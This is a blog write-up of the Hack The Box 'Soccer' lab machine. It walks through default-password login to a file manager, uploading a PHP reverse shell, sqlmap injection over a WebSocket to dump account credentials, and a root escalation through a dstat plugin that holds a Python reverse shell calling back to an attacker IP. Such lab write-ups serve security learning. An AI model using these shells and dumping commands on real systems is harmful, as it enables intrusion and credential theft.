---
layout: post
title:  "Hackthebox - Soccer writeup"
date:   2023-05-17 19:00:00 +0300
categories: HTB write-up
description: "Hackthebox - HTB Soccer writeup - how to solve this box"
keywords: "Hack the box, HTB, writeup, Soccer"
---

This has been a fun box. It is ranked as easy, but I would argue it is more difficult than that. Pawning the user takes some time and thought.


## Initial foothold

As always, let's start with a port scan.

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-nmap-soccer.png "HTB soccer nmap scan")

<br>

The only interesting finding for now is the http service on port 80, which is a simple static html page under the soccer.htb domain. Nothing much we can do about it. Let's brute force soccer.htb with gobuster.

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/gobuster-soccer-htb.png "HTB soccer gobuster")

<br>

We find only one subdirectory /tiny. It turns out to be a very simple php file management system. By vising the official Tiny file manager page on Github I can see a list of default passwords for admin and user. And of course they work...

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-tinyfilemanager.png "HTB soccer tinyfilemanager")

<br>


When logging in as admin I can browse the webpage directory and I can see an upload function as well (not visible in the image below).

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-admin-tinyfilemanager.png "HTB soccer admin tinyfilemanager")

<br>

I uploaded the php-reverse-shell.php script that can be found under /usr/share/webshells/php in kali linux. I set my IP adress and a preferable port number and uploaded the script. Before visiting the link where the script resides I start netcat locally on my machine.

```
nc -lvp 4444
```

When visiting the php link from my browser I get a shell as www-data on my kali machine. The next step is to get a user.

<br>

## User flag

At this point I was using grep and find to check in interesting files and folders and see what services are being run on the machine. I particularly searched for references of "player" as that is the name of the user according the folder found under /home. What caught my eye is the following:

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-user-flag-1.png "HTB soccer user flag")

<br>

It clearly looks like another subdomain that I can access. I had to add the same configuration in my /etc/hosts file to be able to access the soc-player.soccer.htb subdomain.

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-user-flag-2.png "HTB soccer user flag subdomain")

<br>

I checked around and tried sql injection on the forms, but I didn't find anything interesting. When registering a user I see that under Tickets there is another form that I can use to interact with the server.

I routed traffic through Burp and I see that it is essentially a web socket connection being utilized to check validity of tickets.

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-user-flag-3.png "HTB soccer Websocket protocol switch")

<br>


<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-user-flag-4.png "HTB soccer Websocket protocol burp")

<br>

At this point the websocket connection seemed the only alternative I had to move forward with this machine. I simply googled for websocket exploits as I didn't have much experience with websockets.

Eventually I found that sql injections could be suitable for my scenario and also I ended up reading this blog post: [Automating Blind SQL injection over WebSocket](https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html?ref=appsecguy.se)

I followed the instructions as detailed in that blog post to run sqlmap over a websocket connection. All you need to do is use:

```
ws_server = "ws://soc-player.soccer.htb:9091"
```

and set

```
data = '{"id":"%s"}' % message
```

You then run the python script on your kali machine and execute sqlmap from another shell as follows:

```
sqlmap -u "http://localhost:8081/?id=1" -p “id”
```

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-sqlmap.png "HTB soccer SQLMap")

<br>

Bingo, I found an sql injection vulnerability.

Eventually I found myself running a few extra sqlmap commands to get a dump of the database table holding the passwords.

```
sqlmap -u "http://localhost:8081/?id=1" -p "id" --dump -D soccer_db -T accounts
```

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-sqlmap-2.png "HTB soccer SQLMap credentials dumping")

<br>

Let's try to login as the user "player" using ssh.

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-ssh-login.png "HTB soccer SSH login")

<br>

## Root flag

I download and run [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS?ref=appsecguy.se) to find privilege escalation paths.

I see dstat under group writable files and my user having executable rights for doas, which is a sudo alternative. My current user did not have sudo rights unfortunately.

dstat can run python plugins that found in specific directories, as per this [post](https://gtfobins.github.io/gtfobins/dstat/?ref=appsecguy.se).

If I place a python reverse shell from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md?ref=appsecguy.se#python) in /usr/local/share/dstat and then execute that  python script with dstat, by calling dstat using doas, I should get an elevated shell back at my attacker machine.

I saved the following python script as dstat-plugin in /usr/local/share/dstat.

```
import socket,os,pty;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

s.connect(("10.10.14.27",4444));

os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

pty.spawn("/bin/sh")
```

I started a listener on my Kali machine.

```
nc -lvp 4444
```

Finally, I executed the python script with:

```
doas -u root /usr/bin/dstat  --plugin
```

<br>

![image]({{site.baseurl}}/docs/assets/images/2023/htb-soccer-root-flag.png "HTB soccer root flag")

<br>